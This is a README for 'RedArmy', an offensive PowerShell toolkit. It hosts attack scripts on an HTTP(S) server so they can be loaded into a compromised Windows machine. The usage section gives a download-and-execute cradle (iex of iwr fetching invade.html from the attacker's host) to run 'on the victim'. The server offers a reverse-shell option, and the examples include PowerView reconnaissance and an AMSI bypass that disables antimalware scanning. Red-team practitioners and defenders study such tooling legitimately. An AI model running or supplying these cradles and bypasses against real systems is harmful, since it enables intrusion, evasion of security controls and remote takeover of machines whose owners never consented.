# RedArmy

## Installation

```
$ git clone https://gitlab.com/mjwhitta/redarmy.git
$ cd ./redarmy
$ git submodule update --init --recursive
$ git submodule foreach ../../scripts/update_module # optional
```

## Configuration

RedArmy uses `config.default` as [the default config]. You can copy it
to `config` and add or delete lines as necessary.

Config entries look like the following:

```
name action path
```

Name and path are fairly self-explanatory. Actions are as follows:

- `get`
    - Creates
        - `Get-<name>`
            - Get file contents
        - `Deploy-<name>`
            - Create ScriptBlock and run in provided PSSession
- `get-bin`
    - Creates
        - `Import-<name>`
            - Create assembly object and load into memory
        - `Deploy-<name>`
            - Create assembly object and load into memory in provided
              PSSession
- `run`
    - Creates
        - `Get-<name>`
            - Get file contents
        - `Invoke-<name>`
            - Run `iex` on file contents
        - `Invoke-<name>InBg`
            - Run `iex` on file contents in background
        - `Deploy-<name>`
            - Create ScriptBlock and run in provided PSSession
        - `Deploy-<name>InBg`
            - Create ScriptBlock and run in provided PSSession in
              background
- `run-bin`
    - Not yet implemented

See [the default config] for examples. See [Examples](#examples) for
more details on how to use these functions.

[the default config]: ./config.default

## Usage

```
$ ./serve -h
Usage: serve [OPTIONS] <ip>

Spin up a simple HTTP(S) server to host the RedArmy scripts.

Options:
    --cert=PEM           Use the specified cert PEM file for TLS,
                         implies --tls, requires --key
    -c, --config=FILE    Use the specified config
    -h, --help           Display this help message
    --invade=FILE        Use the specified invade filename instead of
                         invade.html
    --key=PEM            Use the specified key PEM file for TLS,
                         implies --tls, requires --cert
    --no-color           Disable colorized output
    -p, --port=NUM       Use the specified port (default: 8080 for
                         HTTP, 8443 for TLS)
    -r, --rport=NUM      Use the specified port for reverse shell
                         (default: 4444)
    --rshell=FILE        Use the specified rshell filename instead of
                         rshell.html
    --tls                Use TLS
    -u, --update         Update git submodules before starting server
```

Once the `serve` script is running, you can use the following to load
RedArmy on the victim:

- `iex (iwr -DisableKeepAlive -UseBasicParsing
  http://<ip>:<port>/invade.html)`

That command will also displayed for you to copy and paste for
convenience.

### Examples

- Load ps1 script into current session
    - `iex (Get-PowerView)`
- Load ps1 script into specified session
    - `Deploy-PowerView <session>`
- Load binary object into current session
    - `Import-ADModule`
- Load binary object into specified session
    - `Deploy-ADModule <session>`
- Run ps1 script in current session
    - `Invoke-AMSIBypass`
- Run ps1 script in current session in background
    - `Invoke-AMSIBypassInBg`
- Run ps1 script in specified session
    - `Deploy-AMSIBypass <session>`
- Run ps1 script in specified session in background
    - `Deploy-AMSIBypassInBg <session>`
